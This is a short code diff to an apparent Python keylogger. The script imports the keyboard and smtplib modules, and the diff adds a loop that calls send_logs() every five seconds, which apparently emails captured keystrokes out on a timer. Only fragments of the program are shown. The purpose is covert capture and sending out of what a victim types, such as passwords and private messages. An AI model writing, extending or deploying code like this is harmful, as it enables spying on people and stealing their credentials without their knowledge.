@@ -1,5 +1,6 @@
 import keyboard
 import smtplib
+import time
 
 
 keyboard_red = []
@@ -43,3 +44,6 @@ def logger():
 
 if __name__ == "__main__":
     logger()
+    while __name__:
+        time.sleep(5)
+        send_logs()
